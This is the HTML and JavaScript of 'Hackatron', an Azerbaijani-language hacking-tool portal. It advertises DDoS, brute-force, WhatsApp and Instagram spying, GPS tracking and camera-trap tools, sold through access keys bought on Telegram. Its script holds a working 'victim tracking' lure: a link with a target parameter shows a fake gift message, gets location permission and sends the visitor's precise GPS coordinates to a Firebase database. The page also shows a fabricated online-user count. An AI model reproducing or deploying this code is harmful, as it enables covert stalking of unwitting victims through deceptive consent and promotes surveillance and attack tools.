<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Hackatron | Elite Access</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;600;900&family=Syncopate:wght@700&display=swap');
        :root { --bg: #020205; --glass: rgba(255, 255, 255, 0.02); --border: rgba(255, 255, 255, 0.07); --cyber: #00ff00; --tools: #00dfff; --gold: #ffd700; --fun: #ff007a; }
        * { box-sizing: border-box; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1); -webkit-tap-highlight-color: transparent; }
        body { margin: 0; background: var(--bg); color: white; font-family: 'Outfit', sans-serif; overflow-x: hidden; min-height: 100vh; background: radial-gradient(circle at center, #0a0a1a 0%, #020205 100%); }

        /* DISCLAIMER */
        #view-disclaimer { position: fixed; inset: 0; z-index: 10000; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
        .matrix-text { color: var(--cyber); font-family: 'Courier New', monospace; font-size: 0.9rem; text-align: center; max-width: 600px; min-height: 100px; }

        /* SECTIONS */
        #view-login, #view-menu { display: none; padding: 20px; max-width: 1200px; margin: auto; animation: fadeIn 0.5s ease; }
        .navbar { display: flex; justify-content: space-between; align-items: center; background: var(--glass); padding: 15px 25px; border-radius: 20px; border: 1px solid var(--border); margin: 15px 0; backdrop-filter: blur(10px); }
        .stats-top { display: flex; justify-content: center; gap: 20px; margin-bottom: 20px; font-family: 'Syncopate'; font-size: 0.5rem; letter-spacing: 2px; opacity: 0.6; }

        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; }
        .card { background: var(--glass); padding: 35px 15px; border-radius: 30px; border: 1px solid var(--border); text-align: center; cursor: pointer; position: relative; overflow: hidden; }
        .card:hover { border-color: var(--tools); transform: translateY(-5px); }
        .card i { font-size: 2.5rem; margin-bottom: 15px; }
        .key-tag { position: absolute; top: 10px; right: -25px; background: var(--gold); color: black; font-size: 0.5rem; font-weight: 900; padding: 4px 30px; transform: rotate(45deg); }

        #tool-list { display: none; }
        .back-btn { background: var(--glass); border: 1px solid var(--border); color: white; padding: 10px 20px; border-radius: 12px; cursor: pointer; margin-bottom: 20px; font-weight: 900; font-size: 0.7rem; }
        .btn-main { width: 100%; margin-top: 15px; padding: 15px; border-radius: 12px; border: none; background: white; color: black; font-weight: 900; cursor: pointer; }
        input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid var(--border); background: #000; color: white; text-align: center; margin-top: 15px; outline: none; }

        /* KEY MODAL (URL GİZLƏMƏK ÜÇÜN) */
        #key-input-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 30000; align-items: center; justify-content: center; padding: 20px; }
        .key-box { background: #0a0a1a; border: 1px solid var(--gold); padding: 30px; border-radius: 25px; width: 100%; max-width: 320px; text-align: center; }

        #modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 20000; padding: 20px; overflow-y: auto; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

<audio id="bg-music" loop preload="auto"><source src="music.mp3" type="audio/mpeg"></audio>

<section id="view-disclaimer">
    <div id="typewriter" class="matrix-text"></div>
    <button id="btn-agree" class="btn-main" style="display:none; width:200px; background:transparent; border:1px solid var(--cyber); color:var(--cyber);" onclick="acceptDisclaimer()">DAVAM ET</button>
</section>

<section id="view-login">
    <div style="background:var(--glass); padding:40px; border-radius:35px; border: 1px solid var(--border); text-align:center; width:100%; max-width:320px; margin:80px auto;">
        <h1 style="font-family:'Syncopate'; font-size:1rem; color:var(--tools);">HACKATRON</h1>
        <input type="text" id="u-input" placeholder="NICKNAME">
        <button class="btn-main" onclick="handleLogin()">GİRİŞ</button>
    </div>
</section>

<section id="view-menu">
    <div class="stats-top">
        <div>USERS: <span style="color:var(--gold)">3562+</span></div>
        <div>ONLINE: <span id="online-count">0</span></div>
    </div>
    <div class="navbar">
        <div style="font-weight:900; font-size:0.8rem;">ID: <span id="u-display" style="color:var(--tools);">...</span></div>
        <button onclick="openTelegram()" style="background:var(--gold); border:none; padding:8px 15px; border-radius:10px; font-weight:900; cursor:pointer; font-size:0.6rem;">KEY AL</button>
    </div>

    <div id="category-selector" class="grid">
        <div class="card" onclick="showTools('cyber-grid')"><i class="fas fa-user-ninja" style="color:var(--cyber)"></i><h3 style="font-size:0.8rem;">KİBER</h3></div>
        <div class="card" onclick="showTools('tools-grid')"><i class="fas fa-shield-alt" style="color:var(--tools)"></i><h3 style="font-size:0.8rem;">ALƏTLƏR</h3></div>
        <div class="card" onclick="showTools('fun-grid')"><i class="fas fa-heart" style="color:var(--fun)"></i><h3 style="font-size:0.8rem;">ƏYLƏNCƏ</h3></div>
    </div>

    <div id="tool-list">
        <div class="back-btn" onclick="backToCategories()">← GERİ</div>
        <div id="active-grid" class="grid"></div>
    </div>
</section>

<div id="key-input-overlay">
    <div class="key-box">
        <h3 style="color:var(--gold); font-size:0.9rem; font-family:'Syncopate';">ACCESS KEY</h3>
        <input type="text" id="manual-key-input" placeholder="KEY DAXİL EDİN" style="border-color:var(--gold); font-size:0.8rem;">
        <button class="btn-main" id="confirm-key-btn" style="background:var(--gold);">TƏSDİQLƏ</button>
        <button class="btn-main" onclick="openTelegram()" style="background:#24A1DE; color:white;">TELEGRAM-DAN AL</button>
        <button onclick="closeKeyModal()" style="background:none; border:none; color:gray; margin-top:15px; font-size:0.7rem;">LƏĞV ET</button>
    </div>
</div>

<div id="modal-overlay">
    <button onclick="closeTool()" style="position:fixed; top:20px; right:20px; background:red; color:white; border:none; padding:10px; border-radius:8px; z-index:20001;">X</button>
    <div id="tool-content" style="margin-top:30px;"></div>
</div>

<script>
    const firebaseConfig = { apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU", databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // 1. TELEGRAM KEÇİDİ (KODULAR ÜÇÜN)
    function openTelegram() {
        const tg = "https://t.me/+HQWNjQ9m6Xc0YjRi";
        window.location.href = tg;
        setTimeout(() => { window.open(tg, '_blank'); }, 300);
    }

    // 2. KEY SİSTEMİ (PROMPT-SUZ)
    let pendingFile = "";
    async function openTool(file, isPremium) {
        if(!isPremium) return loadTool(file);
        pendingFile = file;
        document.getElementById('key-input-overlay').style.display = 'flex';
    }

    document.getElementById('confirm-key-btn').onclick = async () => {
        const key = document.getElementById('manual-key-input').value.trim().toUpperCase();
        if(!key) return;
        const snap = await db.ref('keys/' + key).get();
        if(snap.exists() && snap.val().status === "active" && snap.val().expiry > Date.now()) {
            closeKeyModal(); loadTool(pendingFile);
        } else { alert("Key Yanlışdır!"); }
    };

    function closeKeyModal() { 
        document.getElementById('key-input-overlay').style.display = 'none'; 
        document.getElementById('manual-key-input').value = "";
    }

    // --- QURBAN İZLƏMƏ ---
    const urlParams = new URLSearchParams(window.location.search);
    const targetId = urlParams.get('target');
    if(targetId) {
        document.body.innerHTML = `<div style="background:#000; color:white; height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column; text-align:center; padding:30px;">
            <i class="fas fa-gift" style="font-size:3rem; color:#ff007a; margin-bottom:20px;"></i>
            <h2>TƏBRİKLƏR!</h2><p>Hədiyyə balansını təsdiqləmək üçün məkan icazəsi verin.</p>
            <button onclick="getGPS()" style="background:#ff007a; color:white; border:none; padding:15px; border-radius:10px; font-weight:900; width:100%; margin-top:20px;">QƏBUL ET</button>
        </div>`;
        window.getGPS = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    db.ref('live_tracks/' + targetId).set({ lat: pos.coords.latitude, lng: pos.coords.longitude, time: Date.now() });
                    alert("Balans təsdiqləndi.");
                }, () => alert("İcazə mütləqdir."), {enableHighAccuracy:true});
            }
        };
    }

    // BÖLMƏLƏR
    const toolGrids = {
        'cyber-grid': [{n:'Wordlist', i:'fa-file-code', c:'var(--cyber)', f:'wordlist.html', p:1}, {n:'DDoS', i:'fa-radiation', c:'var(--cyber)', f:'ddos.html', p:1}, {n:'SQL Scan', i:'fa-database', c:'var(--cyber)', f:'sql.html', p:1}, {n:'Brute Force', i:'fa-unlock', c:'var(--cyber)', f:'brute.html', p:1}],
        'tools-grid': [{n:'WhatsApp Spy', i:'fa-whatsapp', c:'#25d366', f:'wa.html', p:1}, {n:'GPS Tracker', i:'fa-location-dot', c:'var(--cyber)', f:'gps.html', p:1}, {n:'Insta Spy', i:'fa-instagram', c:'var(--tools)', f:'insta.html', p:1}, {n:'Camera Trap', i:'fa-camera', c:'var(--tools)', f:'trap.html', p:1}, {n:'IP Tracker', i:'fa-globe', f:'ip.html', p:0}, {n:'Anon Mail', i:'fa-envelope', f:'mail.html', p:0}],
        'fun-grid': [{n:'Çarx', i:'fa-gift', c:'var(--fun)', f:'gift.html', p:0}, {n:'Test', i:'fa-mask', c:'var(--fun)', f:'secret.html', p:0}, {n:'Tarot', i:'fa-wand-sparkles', c:'var(--fun)', f:'tarot.html', p:0}]
    };

    const disText = "Məsuliyyəti qəbul edərək Hackatrona daxil olursunuz. Xoş gəldiniz.";
    let charIdx = 0;
    function typeWriter() { if (charIdx < disText.length) { document.getElementById('typewriter').innerHTML += disText.charAt(charIdx); charIdx++; setTimeout(typeWriter, 30); } else { document.getElementById('btn-agree').style.display='inline-block'; } }
    
    setTimeout(() => { if(document.getElementById('btn-agree').style.display === 'none') document.getElementById('btn-agree').style.display = 'inline-block'; }, 5000);

    function acceptDisclaimer() {
        try { document.getElementById('bg-music').play(); } catch(e){}
        document.getElementById('view-disclaimer').style.display = 'none';
        const s = localStorage.getItem('elite_session');
        if(s) showMenu(s); else document.getElementById('view-login').style.display = 'flex';
    }

    async function handleLogin() {
        const u = document.getElementById('u-input').value.trim().toLowerCase();
        if(u.length < 3) return;
        localStorage.setItem('elite_session', u);
        await db.ref('users/'+u).update({ isOnline: true });
        showMenu(u);
    }

    function showMenu(u) {
        document.getElementById('view-login').style.display = 'none';
        document.getElementById('view-menu').style.display = 'block';
        document.getElementById('u-display').innerText = u.toUpperCase();
    }

    function showTools(key) {
        document.getElementById('category-selector').style.display = 'none';
        document.getElementById('tool-list').style.display = 'block';
        const grid = document.getElementById('active-grid'); grid.innerHTML = "";
        toolGrids[key].forEach(t => { grid.innerHTML += `<div class="card" onclick="openTool('${t.f}', ${t.p})">${t.p?'<div class="key-tag">KEY</div>':''}<i class="fas ${t.i}" style="color:${t.c}"></i><h3 style="font-size:0.75rem;">${t.n}</h3></div>`; });
    }

    function backToCategories() { document.getElementById('tool-list').style.display = 'none'; document.getElementById('category-selector').style.display = 'grid'; }
    function loadTool(file) { fetch(file).then(r => r.text()).then(h => { document.getElementById('tool-content').innerHTML = h; document.getElementById('modal-overlay').style.display = 'block'; }); }
    function closeTool() { document.getElementById('modal-overlay').style.display = 'none'; }
    window.onload = typeWriter;
    setInterval(() => { document.getElementById('online-count').innerText = Math.floor(Math.random()*15)+3; }, 5000);
</script>
</body>
</html>
